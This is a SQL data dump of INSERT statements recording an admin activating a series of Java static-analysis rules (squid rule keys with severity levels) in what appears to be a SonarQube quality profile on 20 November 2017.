INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2451, '2017-11-20 12:17:02.857', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEGJbbGRdfPp-rD3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2452, '2017-11-20 12:17:02.907', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEG7bbGRdfPp-rD4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2453, '2017-11-20 12:17:02.932', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEHUbbGRdfPp-rD5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2454, '2017-11-20 12:17:02.957', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEHtbbGRdfPp-rD6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2455, '2017-11-20 12:17:02.973', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEH9bbGRdfPp-rD7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2456, '2017-11-20 12:17:02.984', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEIIbbGRdfPp-rD8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2457, '2017-11-20 12:17:03.006', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEIebbGRdfPp-rD9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2458, '2017-11-20 12:17:03.024', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEIwbbGRdfPp-rD-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2459, '2017-11-20 12:17:03.038', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEI-bbGRdfPp-rD_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2460, '2017-11-20 12:17:03.092', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEJ0bbGRdfPp-rEA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2461, '2017-11-20 12:17:03.139', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEKjbbGRdfPp-rEB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2462, '2017-11-20 12:17:03.172', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXELEbbGRdfPp-rEC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2463, '2017-11-20 12:17:03.215', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXELvbbGRdfPp-rED');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2464, '2017-11-20 12:17:03.253', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEMVbbGRdfPp-rEE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2465, '2017-11-20 12:17:03.294', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEM-bbGRdfPp-rEF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2466, '2017-11-20 12:17:03.357', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEN9bbGRdfPp-rEG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2467, '2017-11-20 12:17:03.443', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEPTbbGRdfPp-rEH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2468, '2017-11-20 12:17:03.558', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXERGbbGRdfPp-rEI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2469, '2017-11-20 12:17:03.658', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXESqbbGRdfPp-rEJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2470, '2017-11-20 12:17:03.708', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXETcbbGRdfPp-rEK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2471, '2017-11-20 12:17:03.736', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXET4bbGRdfPp-rEL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2472, '2017-11-20 12:17:03.762', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEUSbbGRdfPp-rEM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2473, '2017-11-20 12:17:03.78', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEUkbbGRdfPp-rEN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2474, '2017-11-20 12:17:03.806', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEU-bbGRdfPp-rEO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2475, '2017-11-20 12:17:03.831', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEVXbbGRdfPp-rEP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2476, '2017-11-20 12:17:03.874', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEWCbbGRdfPp-rEQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2477, '2017-11-20 12:17:03.896', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEWYbbGRdfPp-rER');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2478, '2017-11-20 12:17:03.92', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEWwbbGRdfPp-rES');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2479, '2017-11-20 12:17:03.946', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEXKbbGRdfPp-rET');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2480, '2017-11-20 12:17:03.973', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEXlbbGRdfPp-rEU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2481, '2017-11-20 12:17:04.001', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEYBbbGRdfPp-rEV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2482, '2017-11-20 12:17:04.016', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEYQbbGRdfPp-rEW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2483, '2017-11-20 12:17:04.045', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEYtbbGRdfPp-rEX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2484, '2017-11-20 12:17:04.063', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEY_bbGRdfPp-rEY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2485, '2017-11-20 12:17:04.093', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEZdbbGRdfPp-rEZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2486, '2017-11-20 12:17:04.11', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEZubbGRdfPp-rEa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2487, '2017-11-20 12:17:04.135', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEaHbbGRdfPp-rEb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2488, '2017-11-20 12:17:04.16', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEagbbGRdfPp-rEc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2489, '2017-11-20 12:17:04.204', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEbMbbGRdfPp-rEd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2490, '2017-11-20 12:17:04.228', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEbkbbGRdfPp-rEe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2491, '2017-11-20 12:17:04.261', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEcFbbGRdfPp-rEf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2492, '2017-11-20 12:17:04.286', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEcebbGRdfPp-rEg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2493, '2017-11-20 12:17:04.314', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEc6bbGRdfPp-rEh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2494, '2017-11-20 12:17:04.356', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEdkbbGRdfPp-rEi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2495, '2017-11-20 12:17:04.416', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEegbbGRdfPp-rEj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2496, '2017-11-20 12:17:04.486', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEfmbbGRdfPp-rEk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2497, '2017-11-20 12:17:04.556', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEgsbbGRdfPp-rEl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2498, '2017-11-20 12:17:04.612', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEhkbbGRdfPp-rEm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2499, '2017-11-20 12:17:04.649', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEiJbbGRdfPp-rEn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2500, '2017-11-20 12:17:04.672', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEigbbGRdfPp-rEo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2501, '2017-11-20 12:17:04.695', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEi3bbGRdfPp-rEp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2502, '2017-11-20 12:17:04.741', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEjlbbGRdfPp-rEq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2503, '2017-11-20 12:17:04.779', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEkLbbGRdfPp-rEr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2504, '2017-11-20 12:17:04.819', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEkzbbGRdfPp-rEs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2505, '2017-11-20 12:17:04.868', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXElkbbGRdfPp-rEt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2506, '2017-11-20 12:17:04.907', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEmLbbGRdfPp-rEu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2507, '2017-11-20 12:17:04.944', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEmwbbGRdfPp-rEv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2508, '2017-11-20 12:17:04.978', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEnRbbGRdfPp-rEw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2509, '2017-11-20 12:17:05.026', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEoCbbGRdfPp-rEx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2510, '2017-11-20 12:17:05.055', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEofbbGRdfPp-rEy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2511, '2017-11-20 12:17:05.08', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEo4bbGRdfPp-rEz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2512, '2017-11-20 12:17:05.118', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEpebbGRdfPp-rE0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2513, '2017-11-20 12:17:05.154', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEqCbbGRdfPp-rE1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2514, '2017-11-20 12:17:05.2', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEqwbbGRdfPp-rE2');
